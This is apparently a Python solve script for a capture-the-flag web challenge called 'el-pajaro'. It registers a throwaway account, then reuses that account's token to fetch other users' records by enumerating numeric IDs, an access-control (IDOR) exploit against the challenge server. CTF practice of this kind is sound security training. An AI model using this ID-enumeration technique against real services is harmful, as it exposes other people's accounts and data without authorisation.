# crimist el-pajaro solve script
import httpx
import random
import string

endpoint = 'https://el-pajaro.ctf.maplebacon.org/'
client = httpx.Client()

auth = client.post(f'{endpoint}/user/create', json={
    'username': ''.join(random.choice(string.ascii_lowercase) for _ in range(20)),
    'password': 'pass',
})
print(f'[{auth.status_code}]\n{auth.text}')

# can change n depending on db
for i in range(2):
    r = client.get(f'{endpoint}/user/find?id={i}', headers={
        'Authorization': auth.text,
    })
    print(f'[{r.status_code}]\n{r.text}')
